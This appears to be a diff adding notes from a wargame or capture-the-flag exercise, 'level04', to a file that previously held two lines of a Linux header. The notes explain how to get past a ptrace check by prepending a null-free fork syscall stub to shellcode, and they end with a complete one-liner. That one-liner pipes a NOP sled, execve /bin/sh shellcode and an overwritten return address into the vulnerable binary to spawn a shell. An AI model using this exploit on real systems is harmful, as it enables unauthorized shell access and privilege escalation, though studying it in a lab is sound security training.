@@ -1,2 +1,11 @@
-/usr/include/linux/prctl.h
-#define PR_SET_PDEATHSIG  1  /* Second arg is a signal */
+so here we cannot do an exec directly, we need to do a fork first in order to avoid the ptrace(PTRACE_PEEKUSER, pid, 0x2c, 0);
+so we have to preprend the following asm to our usual shellcode:
+
+push 2			; syscall id of fork
+pop eax			; the push-pop is a trick to avoid nul bytes in the resulting shellcode
+int 0x80;		; syscall
+
+which gives:
+"\x6a\x02\x58\xcd\x80" + shellcode
+
+(python -c 'print "\x90" * 106 + "\x6a\x02\x58\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x80\xd6\xff\xff"'; cat) | ~/level04
